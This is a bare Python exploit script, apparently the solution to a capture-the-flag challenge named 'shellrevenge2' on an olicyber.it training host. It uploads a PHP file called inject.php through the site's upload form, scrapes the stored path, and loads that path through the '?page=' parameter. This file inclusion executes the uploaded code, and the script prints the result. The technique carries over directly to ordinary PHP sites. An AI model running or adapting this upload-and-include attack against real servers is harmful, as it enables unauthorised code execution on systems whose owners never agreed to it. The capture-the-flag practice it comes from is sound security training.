import requests, os, bs4

URL = 'http://shellrevenge2.challs.olicyber.it/'
PATH = os.path.dirname(os.path.realpath(__file__))
PHP = 'inject.php'

s = requests.Session()

with open(PATH + '\\' + PHP,'rb') as file:
  r = s.post(
    URL+'?page=upload.php',
    files={'file':file},
    data={'submit':'Invia'}
  )

soup = bs4.BeautifulSoup(r.text, 'html.parser')
for a in soup.find_all('a'):
  if a.text == 'Vai':
    UPLOAD_PATH = a['href'][1:]

print(UPLOAD_PATH)

r1 = s.get(f"{URL}?page={UPLOAD_PATH}")
print(r1.text)

